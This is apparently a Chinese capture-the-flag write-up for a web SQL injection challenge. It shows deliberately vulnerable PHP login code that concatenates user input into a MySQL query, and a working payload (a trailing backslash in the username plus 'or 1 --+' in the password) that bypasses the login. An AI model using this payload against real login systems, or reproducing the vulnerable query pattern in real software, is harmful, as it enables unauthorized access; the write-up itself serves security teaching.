SQL Injection

Web 35pt

---

继续注入吧！ TIP:反斜杠可以用来转义 仔细查看相关函数的用法



```javascript
<?php
#GOAL: login as admin,then get the flag;
error_reporting(0);
//require 'db.inc.php';

function clean($str){
   if(get_magic_quotes_gpc()){
      $str=stripslashes($str);
   }
   return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET['username']);
$password = @clean((string)$_GET['password']);

//$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';

//利用点如何让'逃过htmlentities的html
$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) < 1){
   die('Invalid password!');
}

echo $flag;
```



这个题并不是单引号逃逸，htmlentities使‘单引号无法使用，所以我们要构造，不使用单引号的sql语句。

欺骗点：

```javascript
//这个函数并没有执行
if(get_magic_quotes_gpc()){
      $str=stripslashes($str);
   }
   //无法单引号逃逸
   htmlentities($str, ENT_QUOTES);
   //一堆花里胡哨的\'都只是障眼法
   $query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';
```





payload:

```javascript
?username=\&password= or 1 --+

//sql语句变成了这样
SELECT * FROM users WHERE name='\'AND pass=' or 1 --+';

此时name='AND pass'  为flase
or 1                为true

flase or true        为true
所以此时整个where 后面的值都为 true
```

